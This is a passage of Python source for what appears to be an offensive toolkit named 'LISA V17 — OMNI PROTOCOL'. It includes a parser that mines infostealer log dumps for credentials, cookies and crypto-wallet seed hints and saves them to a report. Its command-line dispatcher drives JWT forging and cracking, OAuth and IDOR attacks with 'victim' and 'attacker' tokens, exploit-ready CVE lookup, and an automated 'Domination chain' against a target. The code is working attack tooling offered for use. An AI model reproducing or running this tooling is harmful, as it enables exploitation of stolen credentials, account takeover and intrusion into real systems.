                fp = os.path.join(root, f)
                try:
                    if f.lower().endswith((".txt", ".log", ".info")):
                        with open(fp, "r", errors="replace") as fh:
                            head = fh.read(2000)
                            all_banners += head
                except Exception:
                    pass
        dirs = set(d.lower() for d in os.walk(path).__next__()[1]) if False else set()
        for fam, sig in self.FAMILY_SIGNATURES.items():
            score = 0
            for fn in sig.get("files", []):
                if fn.lower() in all_files:
                    score += 2
            if sig.get("banner") and sig["banner"].lower() in all_banners.lower():
                score += 3
            if score >= 2:
                families.append((fam, score))
        families.sort(key=lambda x: -x[1])
        return [f[0] for f in families]

    def extract(self, path: str) -> Dict:
        creds, cookies, wallets = [], [], []
        for root, dirs, files in os.walk(path):
            for f in files:
                fp = os.path.join(root, f)
                if not f.lower().endswith((".txt", ".log", ".info", ".json", ".xml")):
                    continue
                try:
                    with open(fp, "r", errors="replace") as fh:
                        content = fh.read()
                except Exception:
                    continue
                for m in self.CRED_LINE_RE.finditer(content):
                    creds.append({"url": m.group(1), "user": m.group(2), "pass": m.group(3), "src": f})
                for m in self.COOKIE_RE.finditer(content):
                    cookies.append({"domain": m.group(1), "name": m.group(2), "value": m.group(3), "src": f})
                if re.search(r"(?i)seed\s*phrase|mnemonic|wallet", content):
                    wallets.append({"src": f, "hint": content.splitlines()[:3]})
        return {"credentials": creds, "cookies": cookies, "wallets": wallets}

    def run(self, path: str):
        print(V17_SIGNATURE)
        print("═" * 64)
        if not os.path.isdir(path):
            print(f"[!] Not a directory: {path}")
            return
        fams = self.detect_family(path)
        print(f"[+] Stealer family: {', '.join(fams) if fams else 'unknown (generic log dump)'}")
        data = self.extract(path)
        print(f"[+] Credentials: {len(data['credentials'])}  Cookies: {len(data['cookies'])}  Wallets: {len(data['wallets'])}")
        for c in data["credentials"][:30]:
            print(f"    cred  {c['url']:<40} {c['user']:<24} {c['pass']}")
        for c in data["cookies"][:20]:
            print(f"    cookie {c['domain']:<30} {c['name']}={c['value'][:30]}")
        for w in data["wallets"]:
            print(f"    💰 wallet hint in {w['src']}: {w['hint']}")
        out = os.path.join(REPORT_DIR, f"stealer_{int(time.time())}.json")
        try:
            os.makedirs(REPORT_DIR, exist_ok=True)
            with open(out, "w") as fh:
                json.dump(data, fh, indent=2)
            print(f"\n[+] Full dump → {out}")
        except Exception as e:
            print(f"[!] Could not write report: {e}")


# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════
def main():
    import argparse
    p = argparse.ArgumentParser(description="LISA V17 — OMNI PROTOCOL")
    p.add_argument("target", nargs="?", help="Target URL/domain (optional for omni mode)")
    p.add_argument("--focus", help="omni | cve | jwt | oauth | authz | osint | stealer")
    p.add_argument("-t", "--targets", nargs="*", help="Batch targets")

    # CVE
    p.add_argument("--poc", help="Lookup a specific CVE-ID with GitHub PoC map")
    p.add_argument("--hunt", help="FTS5 search: keyword/product/vendor/CVE-id")
    p.add_argument("--exploit-only", action="store_true", help="Only CVEs with exploits")
    p.add_argument("--top", type=int, default=20, help="Result limit")
    p.add_argument("--fresh", type=int, help="Show fresh exploit-ready CVEs for a year (e.g. 2026)")
    p.add_argument("--severity", help="Filter: CRITICAL/HIGH/MEDIUM/LOW")

    # JWT
    p.add_argument("--jwt", help="JWT token to attack")
    p.add_argument("--jwt-url", help="Verify forged JWT against a live endpoint")
    p.add_argument("--jwt-wordlist", help="Path to wordlist for HS256 crack")

    # OAuth
    p.add_argument("--oauth", help="Base URL for OAuth/OIDC discovery")
    p.add_argument("--client-id", help="OAuth client_id")
    p.add_argument("--client-secret", help="OAuth client_secret")
    p.add_argument("--redirect-uri", help="OAuth redirect_uri")

    # API authz
    p.add_argument("--authz", help="Base URL for BOLA/IDOR/BFLA testing")
    p.add_argument("--token-a", help="Victim (owner) bearer token")
    p.add_argument("--token-b", help="Attacker bearer token")
    p.add_argument("--resource", help="Resource/object ID to test cross-user access")
    p.add_argument("--user-id", help="Victim user ID")

    # OSINT
    p.add_argument("--osint", help="email=<x> | user=<x> | domain=<x> | pass=<x>")

    # Stealer
    p.add_argument("--stealer", help="Path to infostealer log dump folder")

    a = p.parse_args()

    # Dispatch to the new standalone modules first
    if a.poc or a.hunt or a.fresh:
        eng = CvePoCEngine()
        if a.hunt or a.fresh:
            eng.run(query=a.hunt, severity=a.severity, exploit_only=a.exploit_only,
                    limit=a.top, fresh_year=a.fresh)
        if a.poc:
            r = eng.lookup(a.poc)
            if r:
                sev = (r.get("cvss_severity") or "?").upper()
                print(f"\n[{r['cve_id']}] {sev} {r.get('cvss_score')} exploits={r.get('exploit_count')}")
                print(f"   {(r.get('description') or '')[:250]}")
                print(f"   {eng.github_poc(a.poc)}")
            else:
                print(f"\n[!] {a.poc} not found in local DB. Check:\n    {eng.github_poc(a.poc)}")
        return

    if a.jwt:
        JWTExploitEngine().run(a.jwt, a.jwt_url, a.jwt_wordlist)
        return

    if a.oauth:
        OAuthOidcEngine().run(a.oauth, a.client_id, a.redirect_uri, a.client_secret)
        return

    if a.authz:
        if not (a.token_a and a.token_b):
            print("[!] --authz requires --token-a AND --token-b")
            return
        ApiAuthzEngine().run(a.authz, a.token_a, a.token_b, a.resource, a.user_id)
        return

    if a.osint:
        email = username = domain = password = None
        for part in a.osint.split(","):
            k, _, v = part.partition("=")
            k = k.strip().lower()
            if k == "email":
                email = v.strip()
            elif k in ("user", "username"):
                username = v.strip()
            elif k == "domain":
                domain = v.strip()
            elif k in ("pass", "password"):
                password = v.strip()
        OSINTLeakEngine().run(email, username, domain, password)
        return

    if a.stealer:
        InfostealerParser().run(a.stealer)
        return

    # Fallback: full autonomous (inherited chain) or show help
    if a.target:
        if LEGACY_OK:
            print(V17_SIGNATURE)
            print(f"[+] Running inherited V16 Domination chain + OMNI modules on {a.target}")
            try:
                BacklinkDominatorEngine(target=a.target, focus=a.focus or "omni").run()
            except Exception as e:
                print(f"[!] Legacy chain error: {e}")
        else:
            print(V17_SIGNATURE)
            print("[!] Legacy V1-V16 chain not importable (missing modules).")
            print("    OMNI standalone modules are available — run with --help.")
        return

    p.print_help()


if __name__ == "__main__":
    main()